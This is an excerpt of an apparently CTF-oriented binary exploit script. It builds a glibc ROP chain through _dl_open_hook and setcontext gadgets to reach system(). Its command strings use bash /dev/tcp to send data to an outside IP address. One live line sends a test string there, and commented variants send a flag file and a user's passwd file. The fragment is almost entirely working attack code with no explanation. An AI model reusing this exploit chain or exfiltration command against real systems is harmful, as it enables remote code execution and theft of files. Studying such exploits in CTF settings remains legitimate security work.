...
#addr = p64(0x7fdead33a000) #remote
addr = p64(0x7f91c5332000) #local
...
rcx=0x1211
rsp=libc+0x3ed8e8
rspp=libc+0x4f4e0 # system
payload2=flat(r8,r9,0,0,r12,r13,r14,r15,rdi,rsi,rbp,rbx,rdx,0,rcx,rsp,rspp)


cmd = b'bash -c "echo ABCDEFG > /dev/tcp/140.114.77.172/10999" \x00'
#cmd=b'bash -c "cat /home/ctf/flag > /dev/tcp/140.114.77.172/10999" \x00'
#cmd=b'bash -c "cat /home/hank0438/passwd > /dev/tcp/140.114.77.172/10999" \x00'


payload = flat(
    b"\x00"*0x2e + #  padding
    p64(libc+0x166690+56) +  #  __libc_dlopen_mode+56:  mov rax, cs:_dl_open_hook; call qword ptr [rax]
    cmd.ljust(0x2bb8,b"\x00") + #  padding
    p64(libc+0x3f04a8+8) + #  _dl_open_hook
    p64(libc+0x7ea8f)*4 + #  _IO_new_fgetpos+207:  mov rdi, rax; call qword ptr [rax+20h]
    p64(libc+0x52145) + #  setcontext+53:  mov    rsp,QWORD PTR [rdi+0xa0]
...
b *0x7f91cb7fc6c8   #  __libc_dlopen_mode+56
'''